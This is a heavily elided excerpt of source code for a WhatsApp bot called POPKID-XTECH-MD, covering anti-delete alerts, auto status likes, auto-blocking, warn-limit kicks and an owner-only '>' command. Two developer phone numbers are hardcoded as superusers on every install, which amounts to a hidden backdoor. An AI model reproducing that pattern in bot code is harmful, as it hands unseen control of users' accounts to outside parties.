...
setTimeout(() => {
  async function main() {
    ...
    const sockOptions = {
      ...
      browser: ['POPKID-XTECH-MD', "safari", "1.0.0"],
...
function createNotification(deletedMessage) {
  ...
  let notification = `*❤️XTECH ANTIDELETE❤️*\n\n`;
...
if (conf.AUTO_LIKE_STATUS === "yes") {
    ...
    zk.ev.on("messages.upsert", async m => {
      ...
      const superUserNumbers = [servBot, "254111385747", '254732297194' , conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
      const allAllowedNumbers = superUserNumbers.concat(sudo);
      const superUser = allAllowedNumbers.includes(auteurMessage);
      var dev = ['254111385747', '254732297194'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
      ...
      if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
        zk.sendMessage(auteurMessage, {
          'text': "🚫am blocking you because you have violated Popkid Tech policies🚫!"
        });
...
if (texte && texte.startsWith('>')) {
  ...
  if (!superUser) {
    const menuText = `This command is only for the owner or Popkid Tech to execute 🚫`;
    ...
    await zk.sendMessage(origineMessage, {
      ...
      contextInfo: {
        externalAdReply: {
          title: conf.BOT,
          body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘᴏᴘᴋɪᴅ ʜᴀᴄᴋɪɴɢ ᴛᴇᴀᴍ 👻",
          sourceUrl: conf.GURL,
          thumbnailUrl: "https://i.ibb.co/n6rw805/694affc7ca5a5fb0cb58c2b4533f962d.jpg" || conf.BOT_MENU_LINK,
          mediaType: 1,
 ...
 //---------------------------------------rang-count--------------------------------
  ...
  try {
           ...
           // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
            ...
            var action = await atbrecupererActionJid(origineMessage);
              ...
              if (action === 'remove') {
                ...
                txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by Popkid Hacking Team 👻.`;
    ...
    let warnlimit = conf.WARN_COUNT
 if ( warn >= warnlimit) { 
  var kikmsg = `XTECH detected a weak bot ;you will be remove because of reaching warn-limit`;
...
`;
    ...
    zk.ev.on("connection.update", async con => {
      ...
      if (connection === "connecting") {
        console.log("ℹ️ Xtech md connecting in your account...");
        ...
        console.log("------------------/-----");
        console.log(" Popkid-md installing ${evt.cm.length} plugins😇\n\n");
